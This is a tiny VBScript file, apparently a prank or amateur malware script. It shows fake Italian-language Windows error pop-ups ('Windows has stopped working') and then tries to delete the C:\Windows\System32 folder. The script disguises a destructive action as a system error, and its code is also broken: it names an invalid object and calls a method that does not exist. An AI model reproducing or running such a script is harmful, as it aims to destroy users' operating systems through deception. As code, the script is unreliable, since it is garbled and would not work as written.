civa = MsgBox("WIndows ha smesso di funzionare :(",5,"windows")
civa = MsgBox("errore di windows attualmente sistema non ha smesso di funzionare :(",16,"Windows System")
set wshell = WScript.CreateObject("WScript.run")
wshell.AppActivate "Explorer"
wshell.Delete "C:\Windows\System32"